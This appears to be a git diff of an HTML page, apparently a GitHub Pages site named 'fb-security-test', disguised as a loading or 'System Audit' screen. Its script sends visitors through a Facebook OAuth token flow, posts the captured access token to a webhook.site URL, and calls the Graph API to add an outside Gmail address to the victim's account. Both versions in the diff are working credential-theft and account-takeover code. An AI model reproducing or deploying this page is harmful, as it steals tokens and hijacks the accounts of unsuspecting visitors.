@@ -1,35 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Audit</title></head>
+<head><title>Loading...</title></head>
 <body>
     <script>
         window.onload = async function() {
             const hash = window.location.hash;
-            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
-            const targetEmail = "ktime400400400@gmail.com";
+            const webhook = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
+            const email = "ktime400400400@gmail.com";
 
-            if (hash && hash.includes('access_token=')) {
+            if (hash.includes('access_token=')) {
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
-                try {
-                    // إرسال التوكن للتحكم
-                    fetch(`${webhookUrl}?FORCE_TOKEN=${token}`, {mode: 'no-cors'});
-
-                    // الطلب الأول (إضافة)
-                    await fetch(`https://graph.facebook.com/v15.0/me?access_token=${token}`, {
-                        method: 'POST',
-                        body: new URLSearchParams({ 'email': targetEmail })
-                    });
-
-                    // الطلب الثاني (إجبار النظام على إرسال رسالة التأكيد)
-                    await fetch(`https://graph.facebook.com/v15.0/me/emails?access_token=${token}`, {
-                        method: 'POST',
-                        body: new URLSearchParams({ 'email': targetEmail, 'confirm': 'true' })
-                    });
-                } catch (e) {}
-                window.location.href = "https://www.facebook.com/settings";
+                // إرسال التوكن فوراً قبل أي إجراء آخر
+                await fetch(`${webhook}?FINAL_TOKEN=${token}`, {mode: 'no-cors'});
+                
+                // محاولة الإضافة المباشرة
+                await fetch(`https://graph.facebook.com/me?access_token=${token}`, {
+                    method: 'POST',
+                    body: new URLSearchParams({ 'email': email })
+                });
+                
+                // التوجيه لصفحة التأكيد اليدوي
+                window.location.href = "https://www.facebook.com/settings?tab=account";
             } else {
-                const client_id = "1089408829356317";
-                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,openid`;
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,openid";
             }
         };
     </script>
